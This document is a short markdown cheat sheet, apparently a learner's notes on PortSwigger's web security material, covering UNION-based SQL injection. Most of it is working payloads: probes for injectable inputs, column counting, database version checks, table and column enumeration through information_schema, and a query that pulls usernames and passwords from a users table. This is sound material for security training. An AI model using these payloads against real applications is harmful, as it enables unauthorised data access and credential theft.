# Portswigger
sql-injection cheat-sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet

## SQLi - UNION Attack
When an application is vulnerable to SQL injection, and the results of the query are returned within the application's responses, you can use the UNION keyword to retrieve data from other tables within the database. This is commonly known as a SQL injection UNION attack.

Note: don't forget to use url encoding

### Test for SQLi
~~~
jeremy'
jeremy"

jeremy' or 1=1#
jeremy' or 1=1--

jeremy' or 1=2--
~~~


### Number of columns
~~~
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
~~~

finding oclumns with a useful data type
~~~
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
~~~


### Database version
~~~
Oracle 	        SELECT banner FROM v$version
                SELECT version FROM v$instance

Microsoft 	SELECT @@version

PostgreSQL 	SELECT version()

MySQL 	        SELECT @@version
~~~

example
~~~
' UNION SELECT NULL,NULL,version()#
~~~

### Database tables
~~~
Oracle 	    SELECT * FROM all_tables
            SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'

Microsoft   SELECT * FROM information_schema.tables
            SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'

PostgreSQL  SELECT * FROM information_schema.tables
            SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'

MySQL 	    SELECT * FROM information_schema.tables
            SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
~~~

example
~~~
' UNION SELECT NULL,NULL,table_name from information_schema.tables#
~~~
### Database columns
example
~~~
' UNION SELECT NULL,NULL,column_name from information_schema.columns#
~~~

### Interesting data
example
~~~
' UNION SELECT username, password FROM users--
~~~

concatenation example
~~~
' UNION SELECT username || '~' || password FROM users--
~~~